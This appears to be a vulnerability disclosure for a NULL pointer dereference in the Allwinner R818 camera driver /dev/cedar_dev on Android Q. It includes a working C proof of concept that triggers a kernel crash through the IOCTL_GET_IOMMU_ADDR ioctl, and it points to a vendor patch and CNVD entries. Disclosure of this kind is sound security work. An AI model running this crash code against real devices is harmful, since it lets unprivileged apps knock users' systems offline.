## Background
Allwinner R818 SoC is made for smart speakers with a screen which is a processor for use in Android-based
It integrates quad-core 64-bit CortexTM-A53 CPU and Imagination PowerVR GE8300 GPU to ensure response rapidity and
running smoothness for daily application, such as on-line video, web browsing, and so on

## Description
There is a NULL Pointer Deference in the camera driver "/dev/cedar_dev". An third-app could use the ioctl cmd "IOCTL_GET_IOMMU_ADDR"to cause a system crash.

## Affect Versions
Soc: Allwinner R818 
System: R818 Android Q 
SDK Version: V1.0 

## POC
The problem code is as follow:

![image](https://user-images.githubusercontent.com/13774458/129021015-5f952b84-0027-445b-aea6-877f01378364.png)

The param sUserIommuParam are from userspace which could use ioctl cmd "IOCTL_GET_IOMMU_ADDR" to pass to driver. The code do not judge if the pVeIommuBuf->fd are valid and the function dma_buf_get will return Null if the pVeIommuBuf->fd is invalid.

The POC is as follow:
```
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include "cedar_ve.h"

struct VE_PROC_INFO {
    unsigned char   channel_id;
    unsigned int    proc_info_len;
};

struct cedarv_env_infomation_compat {
    unsigned int phymem_start;
    int  phymem_total_size;
    int  address_macc;
};

struct user_iommu_param {
    int             fd;
    unsigned int    iommu_addr;
};

#define DEV_NAME                     "/dev/cedar_dev"

int main(){
    int fd = open(DEV_NAME, O_RDONLY, 0);
    int ret = 0;
    if (fd <= 0) {
        printf("open %s failed \n", DEV_NAME);
        return -1;
    }
        // IOCTL_GET_IOMMU_ADDR
        struct user_iommu_param user_iommu_param;
        user_iommu_param.fd = 0;
        user_iommu_param.iommu_addr = 0xffff;
        ret =  ioctl(fd, IOCTL_GET_IOMMU_ADDR, &user_iommu_param);
        if (ret < 0) {
            printf("IOCTL_GET_IOMMU_ADDR Error!!\n");
            return -1;
        } else {
            printf("IOCTL_GET_IOMMU_ADDR Succeed!!\n");
        }
    return 0;
}

```

The crash log is as follow:

![image](https://user-images.githubusercontent.com/13774458/129021450-f5dc253f-7ca5-436a-a811-39086a667533.png)

![image](https://user-images.githubusercontent.com/13774458/129021466-a58f312a-3bcb-494f-a292-2b8d3cbf8273.png)

Could see the crash is locate in "compat_cedardev_ioctl"

## Patch
The patch of Allwinner is as follow:

![image](https://user-images.githubusercontent.com/13774458/129021613-1a935512-36aa-43e6-a165-3a2e3bb3fc53.png)


## References
https://www.cnvd.org.cn/flaw/show/CNVD-2021-49170

https://vul.wangan.com/a/CNVD-2021-49170

https://www.allwinnertech.com/index.php?c=product&a=index&id=92
